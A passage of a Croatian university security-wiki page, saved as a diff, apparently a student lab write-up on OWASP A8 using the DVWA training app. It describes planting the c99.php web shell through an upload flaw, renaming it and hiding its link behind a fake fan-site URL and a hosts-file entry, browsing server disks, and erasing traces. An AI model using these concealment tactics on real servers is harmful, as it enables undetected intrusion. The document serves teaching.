+Ako je pokrenemo, vidimo da radi, i imamo na izboru mnogo mogućnosti kojima možemo ugroziti server, aplikaciju, podatke, i na kraju obrisati zloćudnu php skriptu kao da je nije ni bilo, zbog čega ne postoji trag da smo bili tamo.
+<br />
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:C99.PNG" class="image"><img alt="C99.PNG" src="../images/thumb/b/b9/C99.PNG/1000px-C99.PNG" width="1000" height="540" /></a></div></div>
+<p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Tmatijak&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Tmatijak (stranica ne postoji)">Tmatijak</a> 22:15, 6. siječnja 2012. (CET)
+</p>
+<h3> <span class="mw-headline" id="Failure_to_Restrict_URL_Access_.28A8.29"><b>Failure to Restrict URL Access (A8)</b> </span></h3>
+<p><br />
+Ovakve vrste napada se događaju kada napadač, koji je ovlašteni korisnik sustava, jednostavno promijeni URL i pokuša pristupiti na stranicu kojoj nema pristup. U ovom slučaju mi smo si omogućili pristup pomoću skripte c99.php kada smo iskoristili nedostatak u Upload dijelu DVWA aplikacije.
+<br />
+Jednom kada imamo uploadanu skriptu c99.php koju smo uspjeli postaviti na server u primjeru sa Upload-om, između ostalih mogućnosti, možemo stvarati nove datoteke i premještati ih, tako npr. možemo dodati novi php, u ovom slučaju "bieber.php" kojim imamo vlastitu novu stranicu na severu. 
+<br /><br />
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Upload_bilo_cega.PNG" class="image"><img alt="Upload bilo cega.PNG" src="../images/thumb/b/bc/Upload_bilo_cega.PNG/1000px-Upload_bilo_cega.PNG" width="1000" height="436" /></a></div></div>
+<p><br />
+Ovaj primjer se može iskoristiti na stranicama gdje je dozvoljeno stvarati vlastite profile, poglede, i ostale mogućnosti personalizacije. Tako smo "sakrili" link na fan page, koji izgleda kao pravi link "<a href="http://www.justinbieberofficial.co.uk/" class="external free" rel="nofollow">http://www.justinbieberofficial.co.uk/</a>", ali nas vodi na skriptu bieber_fever.php koja je zapravo c99.php, i ukoliko nitko ne provjerava ovaj naizgled nevin i neupadljiv link, možda ostanemo neotkriveni. Također, ovo maskiranje linkova se može korisiti i u A10-Unvalidated Redirects and Forwards. Potrebno je u C:\Windows\System32\drivers\etc dodati još jednu liniju koda:
+<br /><br />
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Bieber_je_kul.PNG" class="image"><img alt="Bieber je kul.PNG" src="../images/5/5e/Bieber_je_kul.PNG" width="418" height="37" /></a></div></div>
+<p><br /><br />
+bieber.php i "skriveni" link u sredini:
+<br /><br />
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Ubacen_unutra.PNG" class="image"><img alt="Ubacen unutra.PNG" src="../images/thumb/d/d1/Ubacen_unutra.PNG/700px-Ubacen_unutra.PNG" width="700" height="733" /></a></div></div>
+<p><br />
+ako kliknemo na link u sredini, otvorit će se skripta c99.php:
+<br /><br />
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:JB_homepage.PNG" class="image"><img alt="JB homepage.PNG" src="../images/thumb/e/ee/JB_homepage.PNG/700px-JB_homepage.PNG" width="700" height="865" /></a></div></div>
+<p><br />
+jednom kada smo skriveni, možemo mijenjati imena datoteka, i pokušati se što bolje sakriti i prilagoditi sadržaju servera, kako bi ostali neupadljivi. Također. možemo pokretati razne naredbe, kao npr "netstat-an":
+<br /><br />
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Slusanje.PNG" class="image"><img alt="Slusanje.PNG" src="../images/thumb/1/1e/Slusanje.PNG/1000px-Slusanje.PNG" width="1000" height="501" /></a></div></div>
+<p><br /><br />
+također, možemo pregledavati sadržaje svih diskova na serveru, i imamo ovlasti nad folderima i datotekama na tim diskovima:
+<br /><br />
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Neki_disk.PNG" class="image"><img alt="Neki disk.PNG" src="../images/thumb/a/af/Neki_disk.PNG/1000px-Neki_disk.PNG" width="1000" height="211" /></a></div></div>
+<p><br /><br />
+ili ostale mogućnosti kojima možemo pokušati ugroziti server, sakriti se, obrisati podatke ili nešto drugo.
+<br /><br />
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Mogucnosti.PNG" class="image"><img alt="Mogucnosti.PNG" src="../images/thumb/f/f8/Mogucnosti.PNG/1000px-Mogucnosti.PNG" width="1000" height="123" /></a></div></div>
+<p><br />
+</p><p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Tmatijak&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Tmatijak (stranica ne postoji)">Tmatijak</a> 18:40, 6. siječnja 2012. (CET)
+</p>
+<h2> <span class="mw-headline" id="Literatura"> <b>Literatura</b> </span></h2>
+<ul><li><a href="http://en.wikipedia.org/wiki/OWASP" class="external free" rel="nofollow">http://en.wikipedia.org/wiki/OWASP</a> ]
+</li><li><a href="https://www.owasp.org/index.php/Category:OWASP_WebGoat_Project" class="external free" rel="nofollow">https://www.owasp.org/index.php/Category:OWASP_WebGoat_Project</a>
+</li><li><a href="http://serdarbuyuktemiz.blogspot.com/2008/09/broken-authentication-and-session.html" class="external free" rel="nofollow">http://serdarbuyuktemiz.blogspot.com/2008/09/broken-authentication-and-session.html</a> 
+</li><li><a href="http://serdarbuyuktemiz.blogspot.com/2008/09/insecure-direct-object-reference.html" class="external free" rel="nofollow">http://serdarbuyuktemiz.blogspot.com/2008/09/insecure-direct-object-reference.html</a>
+</li><li><a href="http://misc-security.com/blog/2009/09/insecure-cryptographic-storage/" class="external free" rel="nofollow">http://misc-security.com/blog/2009/09/insecure-cryptographic-storage/</a>
+</li><li>OWASP TOP 10-2010, The Ten Most Critical Web Application Security Risks. <a href="https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project" class="external autonumber" rel="nofollow">[2]</a>
+</li><li>PowerPonit prezentacija: OWASP TOP 10-2010, The Ten Most Critical Web Application Security  
+</li></ul>
+<p>Risks <a href="https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project" class="external autonumber" rel="nofollow">[3]</a>
+</p>
+<ul><li><a href="https://www.owasp.org/index.php/Top_10_2010-Main" class="external free" rel="nofollow">https://www.owasp.org/index.php/Top_10_2010-Main</a> 
+</li><li><a href="https://www.owasp.org/index.php/Top_10_2010-A3" class="external free" rel="nofollow">https://www.owasp.org/index.php/Top_10_2010-A3</a>
+</li><li><a href="https://www.owasp.org/index.php/Top_10_2010-A2" class="external free" rel="nofollow">https://www.owasp.org/index.php/Top_10_2010-A2</a> 
+</li><li><a href="https://www.owasp.org/index.php/Top_10_2010-A4" class="external free" rel="nofollow">https://www.owasp.org/index.php/Top_10_2010-A4</a>
+</li><li><a href="https://www.owasp.org/index.php/Top_10_2010-A5" class="external free" rel="nofollow">https://www.owasp.org/index.php/Top_10_2010-A5</a>  
+</li><li><a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)" class="external free" rel="nofollow">https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)</a>
+</li><li><a href="http://www.cgisecurity.com/csrf-faq.html" class="external free" rel="nofollow">http://www.cgisecurity.com/csrf-faq.html</a>
+</li><li><a href="https://www.owasp.org/index.php/Unrestricted_File_Upload" class="external free" rel="nofollow">https://www.owasp.org/index.php/Unrestricted_File_Upload</a>
+</li><li><a href="http://blogs.securiteam.com/index.php/archives/1268" class="external free" rel="nofollow">http://blogs.securiteam.com/index.php/archives/1268</a>
+</li><li><a href="http://www.acunetix.com/websitesecurity/upload-forms-threat.htm" class="external free" rel="nofollow">http://www.acunetix.com/websitesecurity/upload-forms-threat.htm</a>
+</li><li><a href="http://en.wikipedia.org/wiki/Remote_File_Inclusion" class="external free" rel="nofollow">http://en.wikipedia.org/wiki/Remote_File_Inclusion</a>
+</li><li><a href="http://www.securiteam.com/securityreviews/5DP0N1P76E.html" class="external free" rel="nofollow">http://www.securiteam.com/securityreviews/5DP0N1P76E.html</a>
+</li><li><a href="http://en.wikipedia.org/wiki/SQL_injection" class="external free" rel="nofollow">http://en.wikipedia.org/wiki/SQL_injection</a>
+</li><li><a href="http://www.unixwiz.net/techtips/sql-injection.html" class="external free" rel="nofollow">http://www.unixwiz.net/techtips/sql-injection.html</a>
+</li></ul>
+
+<!-- 
+NewPP limit report
+Preprocessor node count: 170/1000000
+Post-expand include size: 0/2097152 bytes
+Template argument size: 0/2097152 bytes
+Expensive parser function count: 0/100
+-->
+
+<!-- Saved in parser cache with key sisds:pcache:idhash:24-0!*!0!!hr!2!edit=0 and timestamp 20190203204030 -->
+<div class="printfooter">
+Dobavljeno iz "<a href="./OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda.html">http://security.foi.hr/wiki/index.php/OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda</a>"</div>
+				<!-- /bodytext -->
+								<!-- catlinks -->
+				<div id='catlinks' class='catlinks catlinks-allhidden'></div>				<!-- /catlinks -->
+												<div class="visualClear"></div>
+			</div>
+			<!-- /bodyContent -->
+		</div>
+		<!-- /content -->
+		<!-- header -->
+		<div id="mw-head" class="noprint">
+			
+<!-- 0 -->
+<div id="p-personal" class="">
+	<h5>Osobni alati</h5>
+	<ul>
+					<li  id="pt-login"><a href="http://security.foi.hr/wiki/index.php?title=Posebno:Prijava&amp;returnto=OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda" title="Predlažemo Vam da se prijavite, ali nije obvezno. [o]" accesskey="o">Prijavi se</a></li>
+			</ul>
+</div>
+
+<!-- /0 -->
+			<div id="left-navigation">
+				
+<!-- 0 -->
+<div id="p-namespaces" class="vectorTabs">
+	<h5>Imenski prostori</h5>
+	<ul>
+					<li  id="ca-nstab-main" class="selected"><span><a href="./OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda.html"  title="Pogledaj sadržaj [c]" accesskey="c">Članak</a></span></li>
+					<li  id="ca-talk" class="new"><span><a href="http://security.foi.hr/wiki/index.php?title=Razgovor:OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda&amp;action=edit&amp;redlink=1"  title="Razgovor o stranici [t]" accesskey="t">Razgovor</a></span></li>
+			</ul>
+</div>
+
+<!-- /0 -->
+
+<!-- 1 -->
+<div id="p-variants" class="vectorMenu emptyPortlet">
+		<h5><span>Inačice</span><a href="./OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda.html#"></a></h5>
+	<div class="menu">
+		<ul>
+					</ul>
+	</div>
+</div>
+
+<!-- /1 -->
+			</div>
+			<div id="right-navigation">
+				
+<!-- 0 -->
+<div id="p-views" class="vectorTabs">
+	<h5>Pogledi</h5>
+	<ul>
+					<li id="ca-view" class="selected"><span><a href="./OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda.html" >Čitaj</a></span></li>
+					<li id="ca-viewsource"><span><a href="http://security.foi.hr/wiki/index.php?title=OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda&amp;action=edit"  title="Ova stranica je zaštićena. Možete pogledati izvorni kod. [e]" accesskey="e">Vidi izvor</a></span></li>
+					<li id="ca-history" class="collapsible "><span><a href="http://security.foi.hr/wiki/index.php?title=OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda&amp;action=history"  title="Ranije izmjene na ovoj stranici. [h]" accesskey="h">Vidi stare izmjene</a></span></li>
+			</ul>
+</div>
+
+<!-- /0 -->
+
+<!-- 1 -->
+<div id="p-cactions" class="vectorMenu emptyPortlet">
+	<h5><span>Radnje</span><a href="./OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda.html#"></a></h5>
+	<div class="menu">
+		<ul>
+					</ul>
+	</div>
+</div>
+
+<!-- /1 -->
+
+<!-- 2 -->
+<div id="p-search">
+	<h5><label for="searchInput">Traži</label></h5>
+	<form action="http://security.foi.hr/wiki/index.php" id="searchform">
+		<input type='hidden' name="title" value="Posebno:Traži"/>
+				<input id="searchInput" name="search" type="text"  title="Pretraži ovaj wiki [f]" accesskey="f"  value="" />
+		<input type='submit' name="go" class="searchButton" id="searchGoButton"	value="Kreni" title="Idi na stranicu s ovim imenom ako ona postoji" />
+		<input type="submit" name="fulltext" class="searchButton" id="mw-searchButton" value="Traži" title="Traži ovaj tekst na svim stranicama" />
+			</form>
+</div>
+
+<!-- /2 -->
+			</div>
+		</div>
+		<!-- /header -->
+		<!-- panel -->
+			<div id="mw-panel" class="noprint">
+				<!-- logo -->
+					<div id="p-logo"><a style="background-image: url(../../images/osslogo.png);" href="../../wiki.html"  title="Glavna stranica"></a></div>
+				<!-- /logo -->
+				
+<!-- navigation -->
+<div class="portal" id='p-navigation'>
+	<h5>Orijentacija</h5>
+	<div class="body">
+				<ul>
+					<li id="n-mainpage-description"><a href="../../wiki.html" title="Posjeti glavnu stranicu [z]" accesskey="z">Glavna stranica</a></li>
+					<li id="n-portal"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Portal_zajednice" title="O projektu, što možete učiniti, gdje je što">Portal zajednice</a></li>
+					<li id="n-currentevents"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Novosti" title="O trenutačnim događajima">Aktualno</a></li>
+					<li id="n-recentchanges"><a href="./Posebno:Nedavne_promjene.html" title="Popis nedavnih promjena u wikiju. [r]" accesskey="r">Nedavne promjene</a></li>
+					<li id="n-randompage"><a href="./Posebno:Slučajna_stranica.html" title="Učitaj slučajnu stranicu [x]" accesskey="x">Slučajna stranica</a></li>
+					<li id="n-help"><a href="./Pomoć:Pomoć.html" title="Mjesto za pomoć suradnicima.">Pomoć</a></li>
+				</ul>
+			</div>
+</div>
+
+<!-- /navigation -->
+
+<!-- SEARCH -->
+
+<!-- /SEARCH -->
+
+<!-- TOOLBOX -->
+<div class="portal" id="p-tb">
+	<h5>Traka s alatima</h5>
+	<div class="body">
+		<ul>
+					<li id="t-whatlinkshere"><a href="http://security.foi.hr/wiki/index.php/Posebno:%C5%A0to_vodi_ovamo/OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda" title="Popis svih stranica koje sadrže poveznice ovamo [j]" accesskey="j">Što vodi ovamo</a></li>
+						<li id="t-recentchangeslinked"><a href="http://security.foi.hr/wiki/index.php/Posebno:Povezane_promjene/OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda" title="Nedavne promjene na stranicama na koje vode ovdašnje poveznice [k]" accesskey="k">Povezane stranice</a></li>
+																																										<li id="t-specialpages"><a href="./Posebno:Posebne_stranice.html" title="Popis posebnih stranica [q]" accesskey="q">Posebne stranice</a></li>
+									<li id="t-print"><a href="http://security.foi.hr/wiki/index.php?title=OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda&amp;printable=yes" rel="alternate" title="Verzija za ispis ove stranice [p]" accesskey="p">Verzija za ispis</a></li>
+						<li id="t-permalink"><a href="http://security.foi.hr/wiki/index.php?title=OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda&amp;oldid=5634" title="Trajna poveznica na ovu verziju stranice">Trajna poveznica</a></li>
+						</ul>
+	</div>
+</div>
+
+<!-- /TOOLBOX -->
+
+<!-- LANGUAGES -->
+
+<!-- /LANGUAGES -->
+			</div>
+		<!-- /panel -->
+		<!-- footer -->
+		<div id="footer">
+											<ul id="footer-info">
+																	<li id="footer-info-lastmod"> Datum zadnje promjene na ovoj stranici: 22:47, 6. siječnja 2012.</li>
+																							<li id="footer-info-viewcount">Ova stranica je pogledana 18.813 puta.</li>
+																							<li id="footer-info-copyright">Sadržaji se koriste u skladu s <a href="http://creativecommons.org/licenses/by-sa/3.0/" class="external ">Creative Commons Attribution Share Alike</a>.</li>
+															</ul>
+															<ul id="footer-places">
+																	<li id="footer-places-privacy"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Za%C5%A1tita_privatnosti" title="SIS Wiki:Zaštita privatnosti">Zaštita privatnosti</a></li>
+																							<li id="footer-places-about"><a href="./SIS_Wiki:O_projektu_SIS_Wiki.html" title="SIS Wiki:O projektu SIS Wiki">O projektu SIS Wiki</a></li>
+																							<li id="footer-places-disclaimer"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:General_disclaimer" title="SIS Wiki:General disclaimer">Odricanje od odgovornosti</a></li>
+															</ul>
+											<ul id="footer-icons" class="noprint">
+					<li id="footer-copyrightico">
+						<a href="http://creativecommons.org/licenses/by-sa/3.0/"><img src="../skins/common/images/cc-by-sa.png" alt="Creative Commons Attribution Share Alike" width="88" height="31" /></a>
+					</li>
+					<li id="footer-poweredbyico">
+						<a href="http://www.mediawiki.org/"><img src="../skins/common/images/poweredby_mediawiki_88x31.png" alt="Powered by MediaWiki" width="88" height="31" /></a>
+					</li>
+				</ul>
+						<div style="clear:both"></div>
+		</div>
+		<!-- /footer -->
+		
+<script src="../load.php%3Fdebug=false&amp;lang=hr&amp;modules=startup&amp;only=scripts&amp;skin=vector&amp;*"></script>
+<script>if ( window.mediaWiki ) {
+	mediaWiki.config.set({"wgCanonicalNamespace": "", "wgCanonicalSpecialPageName": false, "wgNamespaceNumber": 0, "wgPageName": "OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda", "wgTitle": "OWASP Top 10: Problemi autentikacije, kriptografije i referenci koda", "wgAction": "view", "wgArticleId": 24, "wgIsArticle": true, "wgUserName": null, "wgUserGroups": ["*"], "wgCurRevisionId": 5634, "wgCategories": [], "wgBreakFrames": false, "wgRestrictionEdit": [], "wgRestrictionMove": []});
+}
+</script>
+<script>if ( window.mediaWiki ) {
+	mediaWiki.loader.load(["mediawiki.util", "mediawiki.legacy.wikibits", "mediawiki.legacy.ajax"]);
+	mediaWiki.loader.go();
+}
+</script>
+
+<script>if ( window.mediaWiki ) {
+	mediaWiki.user.options.set({"ccmeonemails":0,"cols":80,"contextchars":50,"contextlines":5,"date":"default","diffonly":0,"disablemail":0,"disablesuggest":0,"editfont":"default","editondblclick":0,"editsection":1,"editsectiononrightclick":0,"enotifminoredits":0,"enotifrevealaddr":0,"enotifusertalkpages":1,"enotifwatchlistpages":0,"extendwatchlist":0,"externaldiff":0,"externaleditor":0,"fancysig":0,"forceeditsummary":0,"gender":"unknown","hideminor":0,"hidepatrolled":0,"highlightbroken":1,"imagesize":2,"justify":0,"math":1,"minordefault":0,"newpageshidepatrolled":0,"nocache":0,"noconvertlink":0,"norollbackdiff":0,"numberheadings":0,"previewonfirst":0,"previewontop":1,"quickbar":1,"rcdays":7,"rclimit":50,"rememberpassword":0,"rows":25,"searchlimit":20,"showhiddencats":0,"showjumplinks":1,"shownumberswatching":1,"showtoc":1,"showtoolbar":1,"skin":"vector","stubthreshold":0,"thumbsize":2,"underline":2,"uselivepreview":0,"usenewrc":0,"watchcreations":0,"watchdefault":0,"watchdeletion":0,
+	"watchlistdays":3,"watchlisthideanons":0,"watchlisthidebots":0,"watchlisthideliu":0,"watchlisthideminor":0,"watchlisthideown":0,"watchlisthidepatrolled":0,"watchmoves":0,"wllimit":250,"variant":"hr","language":"hr","searchNs0":true,"searchNs1":false,"searchNs2":false,"searchNs3":false,"searchNs4":false,"searchNs5":false,"searchNs6":false,"searchNs7":false,"searchNs8":false,"searchNs9":false,"searchNs10":false,"searchNs11":false,"searchNs12":false,"searchNs13":false,"searchNs14":false,"searchNs15":false});;mediaWiki.loader.state({"user.options":"ready"});
+}
+</script>		<!-- fixalpha -->
+		<script type="text/javascript"> if ( window.isMSIE55 ) fixalpha(); </script>
+		<!-- /fixalpha -->
+		<!-- Served in 1.179 secs. -->			</body>
+</html>
